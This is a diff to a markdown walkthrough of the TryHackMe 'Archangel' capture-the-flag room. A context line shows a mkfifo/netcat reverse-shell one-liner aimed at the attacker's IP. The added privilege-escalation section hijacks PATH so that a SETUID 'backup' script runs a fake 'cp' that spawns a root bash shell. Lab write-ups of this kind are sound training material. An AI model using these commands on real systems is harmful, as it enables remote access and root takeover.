@@ -95,8 +95,43 @@ www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <yo
 ```
 ### Privesc
 
+The secret directory contains an interesting `backup` script that has the `SETUID` bit set. Using `strings`, we can see that the `cp` command is called to copy files:
 
+The command `cp` is being called but without its full path being mentioned. So, we can create a fake `cp` executable in and prepend its location to `$PATH`. So, whenever `cp` is called our malicious binary gets executed instead of the original `cp` command
 
+```
+archangel@ubuntu:~/secret$ cat > cp << EOF
+> #!/bin/bash
+> /bin/bash -i
+> EOF
+archangel@ubuntu:~/secret$ chmod +x cp
+archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
+```
+
+when we will execute the script, it will use our own `cp` command, which will execute a root shell
+
+#### Alternative
+
+1. Create a fake `cp` file in `/tmp` directory and add the following code to it.
+    
+    ```shell
+$ cd /tmp
+$ touch cp
+$ echo "/bin/bash -p" > cp
+$ cat cp
+$ chmod 777 cp
+    ```
+    
+So, whenever the `cp` command is called `/bin/bash` would get executed with the permission of the effective user (in case of SUID binary, it would be `root`).
+    
+2. Prepend `/tmp` to `$PATH`
+    
+   ```shell
+archangel@ubuntu:~/secret$ $PATH            
+archangel@ubuntu:~/secret$ export PATH=/tmp:$PATH
+   ```
+
+execute `./backup`
 ### References
 [TryHackMe | Cyber Security Training](https://tryhackme.com/room/archangel)
 
